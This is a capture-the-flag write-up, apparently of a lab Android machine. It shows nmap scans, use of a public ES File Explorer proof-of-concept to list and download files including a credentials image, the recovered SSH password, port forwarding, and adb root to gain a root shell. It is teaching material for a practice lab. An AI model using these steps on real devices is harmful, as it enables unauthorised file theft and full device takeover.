---
description: Android!
---

# Explore

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.98.58 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 16:10 +08
Nmap scan report for 10.129.98.58
Host is up (0.0079s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
40951/tcp open     unknown
59777/tcp open     unknown
```

Interesting ports open. I ran a detailed scan because I didn't know what was what.&#x20;

```
$ sudo nmap -p 2222,5555,40951,59777 -sC -sV -O --min-rate 5000 10.129.98.58
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 16:11 +08
Nmap scan report for 10.129.98.58
Host is up (0.0065s latency).

PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| ssh-hostkey: 
|_  2048 7190e3a7c95d836634883debb4c788fb (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
5555/tcp  filtered freeciv
40951/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 27 Jun 2023 08:11:12 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 27 Jun 2023 08:11:12 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 27 Jun 2023 08:11:17 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 27 Jun 2023 08:11:32 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 27 Jun 2023 08:11:17 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 27 Jun 2023 08:11:32 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 27 Jun 2023 08:11:32 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 27 Jun 2023 08:11:32 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.93%I=7%D=6/27%Time=649A99A6%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port40951-TCP:V=7.93%I=7%D=6/27%Time=649A99A5%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
SF:27\x20Jun\x202023\x2008:11:12\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Tue,\x2027\x20Jun\x202023\x2008:1
SF:1:12\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2027\x20Jun\x202023\x
SF:2008:11:17\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Tue,\x2027\x20Jun\x202023\x2008:11:17\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Tue,\x2027\x20Jun\x202023\x2008:11:32\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2027\x20Jun\x
SF:202023\x2008:11:32\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x202
SF:7\x20Jun\x202023\x2008:11:32\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Tue,\x2027\x20Jun\x202023\x2008:11:32\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Sony X75CH-series Android TV (Android 5.0) (94%), Linux 3.8 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1 - 6.0 (Linux 3.4 - 3.14) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.0 - 7.0 (Linux 3.4 - 3.10) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Port 59777 seems to be returning some stuff.&#x20;

### EFS LFI --> SSH Creds

The other ports weren't returning anything interesting. When we visit port 59777, it returns a short response.

<figure><img src="../../../.gitbook/assets/image (3995).png" alt=""><figcaption></figcaption></figure>

A quick Google search reveals that this is running EFS File Explorer, and also some CVEs:

<figure><img src="../../../.gitbook/assets/image (1804).png" alt=""><figcaption></figcaption></figure>

I used the `poc.py` from this repo to send requests to the port and list the files present:

{% embed url="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" %}

```
$ python3 poc.py --cmd listFiles --ip 10.129.98.58
[*] Executing command: listFiles on 10.129.98.58
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", }, 
{"name":"vndservice_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_seapp_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"ueventd.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"5.00 KB (5,122 Bytes)", }, 
{"name":"ueventd.android_x86_64.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"464.00 Bytes (464 Bytes)", }, 
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sys", "time":"6/27/23 04:09:04 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"storage", "time":"6/27/23 04:09:08 AM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", }, 
{"name":"sepolicy", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"357.18 KB (365,756 Bytes)", }, 
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sbin", "time":"6/27/23 04:09:04 AM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", }, 
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"proc", "time":"6/27/23 04:09:04 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"plat_service_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"13.73 KB (14,057 Bytes)", }, 
{"name":"plat_seapp_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"1.28 KB (1,315 Bytes)", }, 
{"name":"plat_property_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"6.53 KB (6,687 Bytes)", }, 
{"name":"plat_hwservice_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"7.04 KB (7,212 Bytes)", }, 
{"name":"plat_file_contexts", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"23.30 KB (23,863 Bytes)", }, 
{"name":"oem", "time":"6/27/23 04:09:04 AM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", }, 
{"name":"odm", "time":"6/27/23 04:09:04 AM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", }, 
{"name":"mnt", "time":"6/27/23 04:09:05 AM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", }, 
{"name":"init.zygote64_32.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"875.00 Bytes (875 Bytes)", }, 
{"name":"init.zygote32.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"511.00 Bytes (511 Bytes)", }, 
{"name":"init.usb.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"5.51 KB (5,646 Bytes)", }, 
{"name":"init.usb.configfs.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"7.51 KB (7,690 Bytes)", }, 
{"name":"init.superuser.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"582.00 Bytes (582 Bytes)", }, 
{"name":"init.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"29.00 KB (29,697 Bytes)", }, 
{"name":"init.environ.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"1.04 KB (1,064 Bytes)", }, 
{"name":"init.android_x86_64.rc", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"3.36 KB (3,439 Bytes)", }, 
{"name":"init", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", }, 
{"name":"fstab.android_x86_64", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"753.00 Bytes (753 Bytes)", }, 
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"dev", "time":"6/27/23 04:09:06 AM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", }, 
{"name":"default.prop", "time":"6/27/23 04:09:04 AM", "type":"file", "size":"1.09 KB (1,118 Bytes)", }, 
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"d", "time":"6/27/23 04:09:04 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"config", "time":"6/27/23 04:09:05 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"cache", "time":"6/27/23 04:09:05 AM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", }, 
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", }, 
{"name":"acct", "time":"6/27/23 04:09:05 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```

The `listPictures` command also returned some stuff:

```
$ python3 poc.py --cmd listPics --ip 10.129.98.58     
[*] Executing command: listPics on 10.129.98.58
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```

`creds.jpg` looks the most interesting. We can download this and view it:

```
$ python3 poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.129.98.58
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
        from: 10.129.98.58
[*] Server responded with: 200
[*] Writing to file: creds.jpg
$ display creds.jpg
```

The picture contains credentials for the user:

<figure><img src="../../../.gitbook/assets/image (1645).png" alt=""><figcaption></figcaption></figure>

Here are the creds: `kristi:Kr1sT!5h@Rp3xPl0r3!`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2078).png" alt=""><figcaption></figcaption></figure>

Great! There was no `/home` within this machine, and I just went to the directory where the pictures were stored:

```
1|:/storage/emulated $ cd 0
:/storage/emulated/0 $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
```

## Privilege Escalation

### ADB Debug --> Root

Earlier, we found port 5555 on the machine and it was being filtered. Based on Hacktricks, port 555 is the Android Debug Bridge service:

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge" %}

To interact with this, we would first need to do port forwarding via `ssh`.&#x20;

{% code overflow="wrap" %}
```
$ sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -oHostKeyAlgorithms=+ssh-rsa -L 5555:127.0.0.1:5555 -p 2222 kristi@10.129.98.58
```
{% endcode %}

Then, we can use `adb` to interact with it:

{% code overflow="wrap" %}
```
$ adb connect localhost                                                       
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555
$ adb root 
restarting adbd as root
$ adb shell                    
x86_64:/ # id                                                                               
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:su:s0
```
{% endcode %}

We are now root! We just need to find `root.txt` now.&#x20;

```
x86_64:/ # find / -name root.txt 2> /dev/null
/data/root.txt
```

Rooted!
